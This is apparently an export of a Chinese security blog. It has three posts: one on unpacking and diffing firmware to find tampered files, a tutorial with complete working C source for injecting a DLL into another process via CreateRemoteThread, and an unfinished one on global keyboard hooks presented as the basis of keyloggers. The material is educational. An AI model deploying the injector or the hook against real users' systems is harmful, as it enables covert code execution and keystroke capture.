<h3 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a><strong>0x01 安装</strong></h3><p>可在 <a href="https://code.google.com/archive/p/firmware-mod-kit/" target="_blank" rel="external">google code</a> 下载    Firmware Mod Kit v0.99 安装包，然后解压安装，安装前需要先安装相应的依赖库。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">For Ubuntu: $ sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic</div><div class="line"></div><div class="line">cd firmware-mod-kit/src</div><div class="line">./configure &amp;&amp; make</div></pre></td></tr></table></figure></p>
<h3 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a><strong>0x02 使用</strong></h3><p>firmware-mod-kit 中包含以下几个工具脚本：</p>
<blockquote>
<p>extract-firmware.sh：解包固件<br>build-firmware.sh：重新打包固件<br>check_for_upgrade.sh：检查更新<br>unsquashfs_all.sh：解包提取出来的 squashfs 文件</p>
</blockquote>
<p><img src="http://ooyovxue7.bkt.clouddn.com/17-6-5/78163658.jpg" alt=""></p>
<h4 id="1）-解包固件"><a href="#1）-解包固件" class="headerlink" title="1） 解包固件"></a><strong>1）</strong> 解包固件</h4><p>使用以下命令解包固件，firmware.bin 为需解包的固件，working_directory 为解包结果存储位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ./extract_firmware.sh firmware.bin working_directory/</div></pre></td></tr></table></figure></p>
<p><img src="http://ooyovxue7.bkt.clouddn.com/17-6-5/6411506.jpg" alt=""></p>
<h4 id="2）重新打包固件"><a href="#2）重新打包固件" class="headerlink" title="2）重新打包固件"></a><strong>2）重新打包固件</strong></h4><p>修改完解包后的文件系统后，使用 build_firmware.sh 重新打包固件，新生成的固件将存在 output_directory 目录下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ./build_firmware.sh output_directory/ working_directory/</div></pre></td></tr></table></figure></p>
<p><img src="http://ooyovxue7.bkt.clouddn.com/17-6-5/10177238.jpg" alt=""></p>
<h3 id="0x03-Directory-Tree-Diff-amp-amp-Fuzzy-Hashing"><a href="#0x03-Directory-Tree-Diff-amp-amp-Fuzzy-Hashing" class="headerlink" title="0x03 Directory Tree Diff &amp;&amp; Fuzzy Hashing"></a><strong>0x03 Directory Tree Diff &amp;&amp; Fuzzy Hashing</strong></h3><p>当我们发现下载的固件是被修改过时，可以使用 <a href="https://github.com/bmaia/binwally" target="_blank" rel="external">binwally</a> 将修改过的固件与<a href="https://downloads.openwrt.org/whiterussian/0.9/default/openwrt-wrtsl54gs-squashfs.bin" target="_blank" rel="external">原版固件</a>对比，从而发现具体修改内容。</p>
<h4 id="1-解包固件"><a href="#1-解包固件" class="headerlink" title="1) 解包固件"></a><strong>1) 解包固件</strong></h4><p>可以看到固件编译日期为 2007-02-03，而文件系统的创建实际为 2017-06-05,说明固件中的文件系统被修改过。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-6-5/63948070.jpg" alt=""></p>
<h4 id="2）差异对比"><a href="#2）差异对比" class="headerlink" title="2）差异对比"></a><strong>2）差异对比</strong></h4><p>google 查找发现 openwrt-wrtsl54gs-squashfs.bin 固件有三个版本，分别为：</p>
<blockquote>
<p><a href="https://downloads.openwrt.org/whiterussian/0.9/default/openwrt-wrtsl54gs-squashfs.bin" target="_blank" rel="external">https://downloads.openwrt.org/whiterussian/0.9/default/openwrt-wrtsl54gs-squashfs.bin</a><br> <a href="https://downloads.openwrt.org/whiterussian/0.9/micro/openwrt-wrtsl54gs-squashfs.bin" target="_blank" rel="external">https://downloads.openwrt.org/whiterussian/0.9/micro/openwrt-wrtsl54gs-squashfs.bin</a><br> <a href="https://downloads.openwrt.org/whiterussian/0.9/pptp/openwrt-wrtsl54gs-squashfs.bin" target="_blank" rel="external">https://downloads.openwrt.org/whiterussian/0.9/pptp/openwrt-wrtsl54gs-squashfs.bin</a></p>
</blockquote>
<p>使用 binwally 对比结果显示”default” 版本的相似性最高，可知，目标固件是 “default” 版本固件的修改版。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-6-5/59066778.jpg" alt=""><br>继续查看具体修改的文件为 /etc/profile 和 /bin/nc。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-6-5/31504566.jpg" alt=""></p>
<hr>
<p>References：<br>[1] <a href="https://code.google.com/archive/p/firmware-mod-kit/wikis/Documentation.wiki" target="_blank" rel="external">firmware-mod-kit - Documentation.wiki</a><br>[2] <a href="https://bitsum.com/firmware_mod_kit.htm" target="_blank" rel="external">Firmware Modification Kit</a><br>[3] <a href="http://blog.csdn.net/qq1084283172/article/details/68061957" target="_blank" rel="external">路由器逆向分析——firmware-mod-kit工具安装和使用说明</a><br>[4] <a href="https://w00tsec.blogspot.com/2015/02/firmware-forensics-diffs-timelines-elfs.html" target="_blank" rel="external">Firmware Forensics: Diffs, Timelines, ELFs and Backdoors</a></p>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> firmware-mod-kit </tag>
            
            <tag> firmware </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[DLL 注入之远程线程注入]]></title>
      <url>/DLL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<p>在 Windows 中有多种方法实现 DLL 注入，<a href="http://0x4c43.cn/DLL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96/">可以使用消息钩子注入 DLL</a>，但是通过消息钩子的方法可控性差，不能准确的注入到指定的进程中。而使用远程线程注入的方法可以实现准确地在指定时刻将 DLL 注入到指定的进程中，其可控性较好。</p>
<h3 id="0x01-注入原理"><a href="#0x01-注入原理" class="headerlink" title="0x01 注入原理"></a><strong>0x01 注入原理</strong></h3><p>使用 Windows 远程线程机制，在本地进程中通过 CreateRemoteThread 函数在其他进程中开启并运行一个线程。CreateRemoteThread 函数原型如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">HANDLE WINAPI CreateRemoteThread (</div><div class="line">	HANDLE                  hProcess,	// 远程进程句柄</div><div class="line">	LPSECURITY_ATTRIBUTES  	lpThreadAttributes,	// 线程的安全属性</div><div class="line">	SIZE_T                  dwStackSize,		// 线程栈的大小</div><div class="line">	LPTHREAD_START_ROUTINE	lpStartAddress,  // 线程入口函数的起始地址</div><div class="line">	LPVOID                  lpParameter, 		// 传递给线程函数的参数</div><div class="line">	DWORD                   dwCreationFlags,	// 线程是否立即启动</div><div class="line">	LPDWORD                 lpThreadId		// 用于保存内核分配给线程的ID</div><div class="line">)；</div></pre></td></tr></table></figure></p>
<p>主要关注三个参数：hProcess、lpStartAddress 和 lpParameter。hProcess 是要执行线程的目标进程句柄；lpStartAddress 是线程函数的起始地址，且该函数必须位于目标进程内；lpParameter 是传递给线程函数的参数。</p>
<p>为了使远程进程加载 DLL，把 LoadLibrary 函数作为 CreateRemoteThread 的线程函数，要加载的 DLL 路径作为线程函数的参数即可。</p>
<blockquote>
<p>让远程进程执行 LoadLibrary 函数加载 DLL 文件，需解决两个问题：<br>1）获得远程进程中 LoadLibrary 函数的地址：Kernel32.dll 是系统基本库，且 Windows 系统中，所有进程加载 Kernel32.dll 模块基址是固定且一致的，所以只需获取本地进程中 LoadLibrary 地址。<br>2）向远程进程传递需加载 DLL 的路径：通过 Windows API 函数把路径写入远程进程中，使用以下API：OpenProcess、VirtualAllocEx、WriteProcessMemory、VirtualFreeEx。</p>
</blockquote>
<h3 id="0x02-注入过程"><a href="#0x02-注入过程" class="headerlink" title="0x02 注入过程"></a><strong>0x02 注入过程</strong></h3><h4 id="1）获取目标进程句柄"><a href="#1）获取目标进程句柄" class="headerlink" title="1）获取目标进程句柄"></a><strong>1）获取目标进程句柄</strong></h4><p>使用 OpenProcess 函数打开远程进程的句柄。访问权限 dwDesiredAccess 需要设置为 PROCESS_ALL_ACCESS。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function">HANDLE WINAPI <span class="title">OpenProcess</span> <span class="params">(</span></span></div><div class="line">	DWORD 	dwDesiredAccess,	<span class="comment">// 指定所得句柄具有的访问权限</span></div><div class="line">	BOOL  	bInheritHandle,		<span class="comment">// 是否可被继承</span></div><div class="line">	DWORD 	dwProcessId		<span class="comment">// 指定要打开的进程ID</span></div><div class="line">);</div><div class="line"></div><div class="line">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)；</div></pre></td></tr></table></figure></p>
<h4 id="2）在目标进程分配内存空间"><a href="#2）在目标进程分配内存空间" class="headerlink" title="2）在目标进程分配内存空间"></a><strong>2）在目标进程分配内存空间</strong></h4><p>使用 VirtualAllocEx 在目标进程中分配足够的内存空间，用于保存要加载 DLL 的路径。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">LPVOID WINAPI <span class="title">VirtualAllocEx</span> <span class="params">(</span></span></div><div class="line">	HANDLE 	hProcess,	<span class="comment">// 目标进程句柄</span></div><div class="line">	LPVOID	lpAddress,	<span class="comment">// 期望的起始地址，通常置为NULL</span></div><div class="line">	SIZE_T  dwSize,		<span class="comment">// 需分配的内存大小</span></div><div class="line">	DWORD  	flAllocationType, <span class="comment">// 分配内存空间的类型，取 MEM_COMMIT</span></div><div class="line">	DWORD 	flProtect		<span class="comment">// 内存访问权限，指定为可读可写：PAGE_READWRITE</span></div><div class="line">);</div><div class="line"></div><div class="line">pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</div></pre></td></tr></table></figure></p>
<h4 id="3）写入-DLL-路径至目标进程"><a href="#3）写入-DLL-路径至目标进程" class="headerlink" title="3）写入 DLL 路径至目标进程"></a><strong>3）写入 DLL 路径至目标进程</strong></h4><p>用 WriteProcessMemory 函数把需加载的 DLL 路径写入到远程进程分配的内存空间。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL WINAPI <span class="title">WriteProcessMemory</span> <span class="params">(</span></span></div><div class="line">	HANDLE    hProcess,		<span class="comment">// 目标进程句柄</span></div><div class="line">	LPVOID    lpBaseAddress,	<span class="comment">// 目标进程内存空间首地址</span></div><div class="line">	LPCVOID   lpBuffer,		<span class="comment">// 需写入数据的内存空间地址</span></div><div class="line">	SIZE_T    nSize,			<span class="comment">// 需写入数据字节数</span></div><div class="line">	SIZE_T    *lpNumberOfBytesWritten	  <span class="comment">// 实际写入的字节数，设置为 NULL</span></div><div class="line">);</div><div class="line"></div><div class="line">WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</div></pre></td></tr></table></figure>
<h4 id="4）获取-LoadLibraryW-地址"><a href="#4）获取-LoadLibraryW-地址" class="headerlink" title="4）获取 LoadLibraryW 地址"></a><strong>4）获取 LoadLibraryW 地址</strong></h4><p>Windows 系统中，LoadLibraryW 函数位于 kernel32.dll 中，并且系统核心 DLL 会加载到固定地址，所以系统中所有进程的 LoadLibraryW 函数地址是相同的。用 GetProcAddress 函数获取本地进程 LoadLibraryW 地址即可。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function">WINAPI <span class="title">GetProcAddress</span> <span class="params">(</span></span></div><div class="line">	MODULE 	hModule,	  <span class="comment">// 模块句柄</span></div><div class="line">	LPCSTR 	lpProcName	<span class="comment">// 函数名</span></div><div class="line">);</div><div class="line"></div><div class="line">hMod = GetModuleHandle(<span class="string">L"kernel32.dll"</span>);</div><div class="line">pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="string">"LoadLibraryW"</span>);</div></pre></td></tr></table></figure></p>
<h4 id="5）在目标进程中运行远程线程"><a href="#5）在目标进程中运行远程线程" class="headerlink" title="5）在目标进程中运行远程线程"></a><strong>5）在目标进程中运行远程线程</strong></h4><p>使用 CreateRemoteThread 函数是目标进程调用 LoadLibraryW 函数加载 DLL。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</div></pre></td></tr></table></figure></p>
<h3 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a><strong>0x03 测试</strong></h3><h4 id="1）需注入-DLL-源码"><a href="#1）需注入-DLL-源码" class="headerlink" title="1）需注入 DLL 源码"></a><strong>1）需注入 DLL 源码</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Injectdll.dll</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tchar.h"</span></span></div><div class="line"></div><div class="line">HMODULE g_hMod = <span class="literal">NULL</span>;</div><div class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvReserved)</span></span></div><div class="line">&#123;</div><div class="line">	TCHAR Msg[<span class="number">50</span>] = _T(<span class="string">"Inject to "</span>);</div><div class="line">	TCHAR szPath[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</div><div class="line">	<span class="keyword">if</span>(!GetModuleFileName(g_hMod, szPath, MAX_PATH))</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	_tcscat(Msg, szPath);</div><div class="line"></div><div class="line">	<span class="keyword">switch</span>( dwReason )</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">case</span> DLL_PROCESS_ATTACH:  </div><div class="line">			OutputDebugString(<span class="string">L"Sucess inject &lt;Injectdll.dll&gt; !!"</span>);</div><div class="line">			MessageBox(<span class="literal">NULL</span>, Msg, TEXT(<span class="string">"InjectDll"</span>), MB_OK);  </div><div class="line">			<span class="keyword">break</span>;  </div><div class="line">		<span class="keyword">case</span> DLL_PROCESS_DETACH:  </div><div class="line">			MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">"Dll unInjected!!!"</span>), TEXT(<span class="string">"InjectDll"</span>), MB_OK);  </div><div class="line">			<span class="keyword">break</span>;  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">return</span> TRUE;  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="2）注入程序"><a href="#2）注入程序" class="headerlink" title="2）注入程序"></a><strong>2）注入程序</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Injectmain.cpp</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tchar.h"</span></span></div><div class="line"></div><div class="line"><span class="function">BOOL <span class="title">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span></span></div><div class="line">&#123;</div><div class="line">	HANDLE hProcess = <span class="literal">NULL</span>, hThread = <span class="literal">NULL</span>;</div><div class="line">	HMODULE hMod = <span class="literal">NULL</span>;</div><div class="line">	LPVOID pRemoteBuf = <span class="literal">NULL</span>;</div><div class="line">	DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</div><div class="line">	LPTHREAD_START_ROUTINE pThreadProc;</div><div class="line"></div><div class="line">	<span class="comment">// Open target process to inject dll</span></div><div class="line">	<span class="keyword">if</span>( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</div><div class="line">	&#123;</div><div class="line">		_tprintf(<span class="string">L"Fail to open process %d ! [%d]\n"</span>, dwPID, GetLastError());</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// Allocate memory in the remote process big enough for the DLL path name</span></div><div class="line">	pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</div><div class="line"></div><div class="line">	<span class="comment">// Write the DLL path name to the space allocated in the target process</span></div><div class="line">	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">	<span class="comment">// Find the address of LoadLibrary in target process(same to this process)</span></div><div class="line">	hMod = GetModuleHandle(<span class="string">L"kernel32.dll"</span>);</div><div class="line">	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="string">"LoadLibraryW"</span>);</div><div class="line"></div><div class="line">	<span class="comment">// Create a remote thread in target process</span></div><div class="line">	hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</div><div class="line">	WaitForSingleObject(hThread, INFINITE);</div><div class="line"></div><div class="line">	CloseHandle(hThread);</div><div class="line">	VirtualFreeEx(hProcess, pRemoteBuf, <span class="number">0</span>, MEM_RELEASE);</div><div class="line">	CloseHandle(hProcess);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, TCHAR *argv[])</div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>( argc != <span class="number">3</span> )</div><div class="line">	&#123;</div><div class="line">		_tprintf(<span class="string">L"Usage: %s &lt;pid&gt; &lt;dll_path&gt; \n"</span>, argv[<span class="number">0</span>]);</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// Inject DLL</span></div><div class="line">	<span class="keyword">if</span>( InjectDll((DWORD)_tstol(argv[<span class="number">1</span>]), argv[<span class="number">2</span>]) )</div><div class="line">		_tprintf(<span class="string">L"InjectDll &lt;%s&gt;sucess! \n"</span>, argv[<span class="number">2</span>]);</div><div class="line">	<span class="keyword">else</span></div><div class="line">		_tprintf(<span class="string">L"InjectDLL &lt;%s&gt; fail! \n"</span>, argv[<span class="number">2</span>]);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="3）测试效果"><a href="#3）测试效果" class="headerlink" title="3）测试效果"></a><strong>3）测试效果</strong></h4><p>运行 Injectmain.exe 将 DLL 注入到进程 3656（notepad.exe）中，注入成功将弹出消息框。</p>
<p><img src="http://ooyovxue7.bkt.clouddn.com/17-5-11/94028700-file_1494473311845_13a5b.png" alt=""><br>查看 notepad.exe 进程加载的模块列表，可以看到 InjectDll.dll 已被加载。</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="http://ooyovxue7.bkt.clouddn.com/17-5-11/35149412-file_1494473313402_167fd.png" alt=""></h2><p>References:<br>[1] 逆向工程核心原理<br>[3] <a href="https://etenal.me/archives/871" target="_blank" rel="external">DLL注入浅析（下）</a></p>
]]></content>
      
        <categories>
            
            <category> Windows </category>
            
        </categories>
        
        
        <tags>
            
            <tag> DLL 注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[DLL 注入之 Windows 消息钩子]]></title>
      <url>/DLL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96/</url>
      <content type="html"><![CDATA[<p>Windows 下的窗口应用程序是基于事件驱动方式工作的，操作系统中点击鼠标和按下键盘都是一种事件，当事件发生时操作系统会将消息发送给相应的应用程序，应用程序收到消息之后会做出响应。</p>
<blockquote>
<p>钩子(Hook)，是Windows提供的一种截获和监视系统中消息的方法，应用程序可以通过 SetWindowsHook 函数设置钩子以监视指定窗口的某种消息，而且所监视的窗口可以是其他进程所创建的。当消息到达后，在目标窗口处理函数之前处理它。</p>
</blockquote>
<h3 id="0x01-钩子原理"><a href="#0x01-钩子原理" class="headerlink" title="0x01 钩子原理"></a><strong>0x01 钩子原理</strong></h3><p>操作系统维护这一个链表进行钩子的管理，每设置一个钩子就在钩链中增加一个节点，最新设定的钩子将会最早获得消息的控制权。此外，每个钩子需要设定一个回调函数（钩子函数），在产生指定消息后作出处理。当指定消息发生时，系统会调用这些回调函数。在回调函数中可以监视消息、修改消息，或者屏蔽消息，使消息无法传递到目的窗口。</p>
<p>根据钩子的范围可分为全局钩子和局部钩子，全局钩子可以钩取所有基于消息机制的应用程序，局部钩子只是钩取指定线程的消息。全局钩子将钩子函数放在一个 DLL 中，当某个进程产生指定消息之后，操作系统会自动将该 DLL 注入到该进程中。</p>
<p>常用钩子类型有以下几种：<br>（1）键盘钩子和低级键盘钩子可以监视各种键盘消息。<br>（2）鼠标钩子和低级鼠标钩子可以监视各种鼠标消息。<br>（3）外壳钩子可以监视各种Shell事件消息。比如启动和关闭应用程序。<br>（4）日志钩子可以记录从系统消息队列中取出的各种事件消息。<br>（5）窗口过程钩子监视所有从系统消息队列发往目标窗口的消息。   </p>
<p>Windows 提供消息钩子相关的 API 主要有 SetWindowsHookEx()、CallNextHookEx() 和 UnhookWindowsHookEx()。</p>
<h3 id="0x02-键盘钩子"><a href="#0x02-键盘钩子" class="headerlink" title="0x02 键盘钩子"></a><strong>0x02 键盘钩子</strong></h3><p>键盘记录器是恶意代码中常见的一种类型，木马编写者通常以隐蔽的方式将键盘记录器安装在目标主机以窃取登录凭证等敏感信息。通过消息钩子可以实现一个键盘记录器，但是这种方法极容易被杀毒软件发现。下面通过一个简单的例子演示全局键盘钩子。</p>
<h4 id="1）安装与卸载钩子"><a href="#1）安装与卸载钩子" class="headerlink" title="1）安装与卸载钩子"></a><strong>1）安装与卸载钩子</strong></h4><p>由于是全局消息钩子，所以需要将消息钩子的安装与卸载放在 DLL 中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus    <span class="comment">// If used by C++ code,</span></span></div><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;          <span class="comment">// export the C interface</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line">_declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">InstallHook</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hModule, <span class="number">0</span>);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">_declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">UninstallHook</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span> (g_hHook)</div><div class="line">	&#123;</div><div class="line">		UnhookWindowsHookEx(g_hHook);</div><div class="line">		g_hHook = <span class="literal">NULL</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure></p>
<p>SetWindowsHookEx 用于安装消息钩子，该函数第二个参数为钩取消息后系统调用的回调函数，函数的返回值为钩子句柄。函数原型如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">HHOOK WINAPI <span class="title">SetWindowsHookExW</span><span class="params">(</span></span></div><div class="line">    _In_ <span class="keyword">int</span> idHook, 					<span class="comment">// type of hook, WH_KEYBOARD is Keyboard hook</span></div><div class="line">    _In_ HOOKPROC lpfn,       <span class="comment">// hook procedure</span></div><div class="line">    _In_opt_ HINSTANCE hmod,  <span class="comment">// handle of hook's DLL</span></div><div class="line">    _In_ DWORD dwThreadId     <span class="comment">// thread ID，0 means global hook</span></div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>UnhookWindowsHookEx 用于卸载消息钩子，它只有一个参数，即需要卸载消息钩子的句柄。</p>
<p>在 DLL 中要将该函数导出供主程序使用，<code>_declspec(dllexport)</code>声明 InstallHook() 和 UninstallHook() 为导出函数。</p>
<h4 id="2）钩子函数"><a href="#2）钩子函数" class="headerlink" title="2）钩子函数"></a><strong>2）钩子函数</strong></h4><p>全局键盘消息钩子会截获所有应用程序的键盘消息，包括系统的控制台程序，为了方便操作，若目标程序为控制台程序（conhost.exe）则直接将消息传递给它；否则当有键盘按下都会弹出消息窗口，并显示按下的按键。具体实现如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(<span class="keyword">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(nCode &gt;= <span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line">		<span class="comment">// bit 31 : transition state. 0 =&gt; press, 1 =&gt; release</span></div><div class="line">		<span class="keyword">if</span> (!(lParam &amp; <span class="number">0x80000000</span>))</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">char</span> tcKey[<span class="number">1000</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line">			<span class="keyword">char</span> tcPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</div><div class="line">			<span class="keyword">char</span> *name = <span class="literal">NULL</span>;</div><div class="line">			GetKeyNameTextA(lParam, tcKey, <span class="number">50</span>);  <span class="comment">// Retrieves a string that represents the name of a key</span></div><div class="line">			GetModuleFileNameA(<span class="literal">NULL</span>, tcPath, MAX_PATH);</div><div class="line">			name = <span class="built_in">strrchr</span>(tcPath,<span class="string">'\\'</span>) + <span class="number">1</span> ;</div><div class="line">			<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name,<span class="string">"conhost.exe"</span>))  <span class="comment">// Console Host Process</span></div><div class="line">				<span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</div><div class="line">			<span class="keyword">else</span></div><div class="line">				MessageBoxA(<span class="literal">NULL</span>, tcKey, name, 